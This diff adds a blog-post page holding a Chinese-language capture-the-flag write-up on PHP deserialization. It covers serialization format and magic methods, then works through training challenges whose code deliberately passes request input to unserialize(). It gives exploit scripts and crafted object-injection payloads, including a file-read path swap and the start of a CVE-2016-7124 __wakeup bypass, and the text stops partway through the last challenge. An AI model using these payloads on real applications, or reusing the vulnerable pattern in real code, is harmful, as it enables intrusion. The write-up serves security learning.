@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Verdana:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.elmo.tw","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="This is the training about PHP Deserialization which created by somebody whos sitting next to me…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Note #1: PHP Deserialization ">
+<meta property="og:url" content="https://blog.elmo.tw/2019/05/02/note-1-php-deserializtion-nisra-training/index.html">
+<meta property="og:site_name" content="Elmo&#39;s writeup">
+<meta property="og:description" content="This is the training about PHP Deserialization which created by somebody whos sitting next to me…">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-05-01T16:58:53.000Z">
+<meta property="article:modified_time" content="2021-05-20T09:36:59.682Z">
+<meta property="article:author" content="Elmo Hsiao">
+<meta property="article:tag" content="Note">
+<meta property="article:tag" content="vulnerability">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.elmo.tw/2019/05/02/note-1-php-deserializtion-nisra-training/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Note #1: PHP Deserialization  | Elmo's writeup</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script src="/js/src/photoswipe.min.js?v="></script>
+  <script src="/js/src/photoswipe-ui-default.min.js?v="></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Elmo's writeup</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blog.elmo.tw/2019/05/02/note-1-php-deserializtion-nisra-training/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Elmo Hsiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Elmo's writeup">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Note #1: PHP Deserialization 
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-05-02 00:58:53" itemprop="dateCreated datePublished" datetime="2019-05-02T00:58:53+08:00">2019-05-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2019/05/02/note-1-php-deserializtion-nisra-training/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/05/02/note-1-php-deserializtion-nisra-training/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>This is the training about PHP Deserialization which created by somebody whos sitting next to me…</p>
+<span id="more"></span>
+
+<p>總共五題，依序從最後一題寫回第一題，不要問我為什麼，不是我不知道，只是我不想說 (￣･ω･￣)</p>
+<h2 id="前導片"><a href="#前導片" class="headerlink" title="前導片"></a>前導片</h2><blockquote>
+<p>some example and table just copy from somebody’s ppt :-)</p>
+</blockquote>
+<h3 id="PHP-Serialize"><a href="#PHP-Serialize" class="headerlink" title="PHP Serialize"></a>PHP Serialize</h3><p>PHP 序列化後的模樣</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sayname</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;elmo&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> sayname());</span><br><span class="line"><span class="comment">// O:7:&quot;sayname&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;elmo&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>輸出之序列化物件其結構為</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">型態為類別 : 類別名稱長度 : 類別名稱 : 類別中的變數個數 :</span><br><span class="line">&#123; 型態為字串 : 變數名稱長度 : 變數名稱 ; 型態為字串 : 字串內容長度 : 字串內容 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在這之前關於序列化與反序列化除了觀念之外接觸的語言只有 java，相較之下覺得 php 序列化後的物件可讀性很高XD</p>
+<p>序列化的型態有以下幾種表示</p>
+<table>
+<thead>
+<tr>
+<th align="center">Serialize</th>
+<th align="center">Format</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">a</td>
+<td align="center">array</td>
+</tr>
+<tr>
+<td align="center">b</td>
+<td align="center">boolean</td>
+</tr>
+<tr>
+<td align="center">d</td>
+<td align="center">double</td>
+</tr>
+<tr>
+<td align="center">i</td>
+<td align="center">integer</td>
+</tr>
+<tr>
+<td align="center">o</td>
+<td align="center">common object</td>
+</tr>
+<tr>
+<td align="center">s</td>
+<td align="center">non-escaped binary string</td>
+</tr>
+<tr>
+<td align="center">S</td>
+<td align="center">escaped binary string</td>
+</tr>
+<tr>
+<td align="center">C</td>
+<td align="center">custom object</td>
+</tr>
+<tr>
+<td align="center">O</td>
+<td align="center">class</td>
+</tr>
+<tr>
+<td align="center">N</td>
+<td align="center">null</td>
+</tr>
+<tr>
+<td align="center">R</td>
+<td align="center">pointer reference</td>
+</tr>
+<tr>
+<td align="center">U</td>
+<td align="center">unicode string</td>
+</tr>
+</tbody></table>
+<h3 id="Serialize-Variable-Type"><a href="#Serialize-Variable-Type" class="headerlink" title="Serialize Variable Type"></a>Serialize Variable Type</h3><p>從 PHP 的序列化物件中也可以判別其變數的訪問類型 (public, private, protected)</p>
+<table>
+<thead>
+<tr>
+<th align="left">Type</th>
+<th align="left">Serialize</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">class test1{<font color="red">public</font> $t1 = “1”;}</td>
+<td align="left">O:5:”test1”:1:{<font color="red">s:2:”t1”;</font>s:1:”1”;}</td>
+</tr>
+<tr>
+<td align="left">class test2{<font color="red">private</font> $t2 = “2”;}</td>
+<td align="left">O:5:”test2”:1:{<font color="red">s:9:”test2t2”;</font>s:1:”2”;}</td>
+</tr>
+<tr>
+<td align="left">class test3{<font color="red">protected</font> $t3 = “3”;}</td>
+<td align="left">O:5:”test3”:1:{<font color="red">s:5:”*t3”;</font>s:1:”3”;}</td>
+</tr>
+</tbody></table>
+<p>private 的變數名稱是 “類別名稱 + 變數名稱”，但長度多了 2，而 protected 的變數名稱前面加了 *，長度也多了 2，原因是空字元 (Null Character)</p>
+<blockquote>
+<p>addslashes(): 在特殊字元前面加反斜線。<br>特殊字元：單引號、雙引號、反斜線、NULL</p>
+</blockquote>
+<p>use addslashes()</p>
+<table>
+<thead>
+<tr>
+<th align="left">Type</th>
+<th align="left">Serialize</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">class test2{<font color="red">private</font> $t2 = “2”;}</td>
+<td align="left">O:5:”test2”:1:{<font color="red">s:9:&quot;\0test2\0t2&quot;;</font>s:1:”2”;}</td>
+</tr>
+<tr>
+<td align="left">class test3{<font color="red">protected</font> $t3 = “3”;}</td>
+<td align="left">O:5:”test3”:1:{<font color="red">s:5:&quot;\0*\0t3&quot;;</font>s:1:”3”;}</td>
+</tr>
+</tbody></table>
+<p>private 和 protected 多出來的兩個字元，分別是類別名稱前後加了空字元、星號前後也加了空字元</p>
+<h3 id="Magic-Methods-in-PHP-class"><a href="#Magic-Methods-in-PHP-class" class="headerlink" title="Magic Methods in PHP class"></a>Magic Methods in PHP class</h3><p>PHP class 中的 Magic Methods，都是以 __ 作為開頭，如果不特別寫他還是存在，只是不會做事，而每個函式都有他的特性，系統會在特定的時機呼叫它。</p>
+<p>簡介這五題會用到的部分</p>
+<table>
+<thead>
+<tr>
+<th align="left">Function</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">__construct</td>
+<td align="left">第一個執行</td>
+</tr>
+<tr>
+<td align="left">__destruct</td>
+<td align="left">最後一個執行</td>
+</tr>
+<tr>
+<td align="left">__call</td>
+<td align="left">呼叫了某個沒有在類別中定義的方法時執行</td>
+</tr>
+<tr>
+<td align="left">__invoke</td>
+<td align="left">物件被當作函數來呼叫時執行</td>
+</tr>
+<tr>
+<td align="left">__toString</td>
+<td align="left">把物件當字串操作時執行</td>
+</tr>
+<tr>
+<td align="left">__wakeup</td>
+<td align="left">在反序列化前執行，會返回一個陣列，列舉要被反序列化的屬性名稱</td>
+</tr>
+<tr>
+<td align="left">__sleep</td>
+<td align="left">在序列化前執行，會返回一個陣列，列舉要被序列化的屬性名稱</td>
+</tr>
+</tbody></table>
+<h2 id="正片開始"><a href="#正片開始" class="headerlink" title="正片開始"></a>正片開始</h2><h3 id="Deserialization-05"><a href="#Deserialization-05" class="headerlink" title="Deserialization 05"></a>Deserialization 05</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Function1</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Function2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>, <span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$tmp</span> = <span class="keyword">$this</span>-&gt;mod;</span><br><span class="line">            <span class="variable">$tmp</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Function3</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;String: &quot;</span>.<span class="keyword">$this</span>-&gt;mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CustomString</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;str-&gt;get_flag();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$your_flag</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;input&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>這是一個要了解每個 Magic Methods 被系統呼叫的條件，並利用 __construct 把 class 串接起來的題目 (<del>沒有要放 exploit 的意思</del>)</p>
+<p>除了認識 Magic Methods 外，在這題終於了解 <code>$this</code> 的意義，舉例來說</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$hello</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span> -&gt; hello = <span class="keyword">new</span> Test2();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span> -&gt; hello -&gt; saysomething();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saysomething</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Here is Test2&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Test1();</span><br><span class="line"><span class="comment">// Here is Test2</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$this -&gt; hello</code> 就是只 <code>Test1 的 $hello</code>，把 “-&gt;” 以 “的” 的敘述方式來理解</p>
+<p>在 Test1 被呼叫時，先將 Test1 的 $hello 宣告他是一個 Test2 類別，使在 class 結束時執行 <code>$this -&gt; hello -&gt; saysomething()</code> 變成 <code>Test2 -&gt; saysomething()</code> 的意思，就是執行 Test2 類別的 saysomething 方法，所以 <code>new Test1()</code> 會 output “Here is Test2”</p>
+<h3 id="Deserialization-04"><a href="#Deserialization-04" class="headerlink" title="Deserialization 04"></a>Deserialization 04</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NISRA</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$target</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;target = <span class="keyword">new</span> Loser();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;target-&gt;action();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Loser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are a loser. Try harder!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code == <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">                show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                show_source(<span class="string">&#x27;fake_flag.php&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$your_flag</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;input&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先建一個 Hacker 類別 (題目是建 Loser)，接著就是要讓 if 判別為 True。exploit:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISRA</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$target</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;target = <span class="keyword">new</span> Hacker();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;target-&gt;action();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span> = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code == <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">                show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                show_source(<span class="string">&#x27;fake_flag.php&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> NISRA());</span><br></pre></td></tr></table></figure>
+
+<p>獲得的序列化物件 <code>O:5:&quot;NISRA&quot;:1:&#123;s:6:&quot;target&quot;;O:6:&quot;Hacker&quot;:1:&#123;s:7:&quot;*code&quot;;i:3735928559;&#125;&#125;</code> 送回去是錯的，原因是 $code 型態為 protected，序列化後 <code>*</code> 的前後都有一個空字元，在 url 中以 %00 表示，修改後 <code>O:5:&quot;NISRA&quot;:1:&#123;s:6:&quot;target&quot;;O:6:&quot;Hacker&quot;:1:&#123;s:7:&quot;%00*%00code&quot;;i:3735928559;&#125;&#125;</code>，送出即得到 flag</p>
+<h3 id="Deserialization-03"><a href="#Deserialization-03" class="headerlink" title="Deserialization 03"></a>Deserialization 03</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileExplorer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br><span class="line">            show_source(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NISRA</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;hi.php&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$obj</span> = <span class="keyword">new</span> FileExplorer(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$your_flag</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;input&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>__wakeup(): 在反序列化前執行</p>
+<p>先試著 <code>echo serialize(new NISRA());</code></p>
+<p>獲得 <code>O:5:&quot;NISRA&quot;:1:&#123;s:4:&quot;file&quot;;s:6:&quot;hi.php&quot;;&#125;</code></p>
+<p>送回題目得到 <code>flag is in ./5k4g4flag.php</code></p>
+<p>這時可以直接手動把序列化物件中的 hi.php 改成 5k4g4flag.php，且字串內容長度也要記得改，或是將 exploit 中的 $file 值改為 5k4g4flag.php 再生成一次序列化物件，我是選擇後者，因為懶 :3</p>
+<p>最後 exploit 產生之序列化物件 <code>O:5:&quot;NISRA&quot;:1:&#123;s:4:&quot;file&quot;;s:13:&quot;5k4g4flag.php&quot;;&#125;</code> 送回去即得 flag</p>
+<h3 id="Deserialization-02"><a href="#Deserialization-02" class="headerlink" title="Deserialization 02"></a>Deserialization 02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&quot;deadbeef&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key !== <span class="variable">$serect</span>)&#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="string">&quot;You can not read the flag.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$your_flag</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;input&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>雖然最後執行的 <code>__destruct()</code> 會 <code>echo $flag</code>，但因為要執行 <code>unserialize()</code>，還是會在 <code>__destruct()</code> 之後執行 <code>__wakeup()</code>，導致 flag 被覆寫掉，而不知道 <code>$secret</code> 的值，必須想辦法繞過 <code>__wakeup()</code> 讓系統不要執行它</p>
+<p>這邊在考 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124">CVE-2016-7124</a>，這是發生在 php 5.6.25 之前以及 php 7.0.10 之前，因對某些無效物件處理不當造成的漏洞</p>
+<p>先產生一個正常的序列化物件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&quot;deadbeef&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> serialize(<span class="keyword">new</span> Flag());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
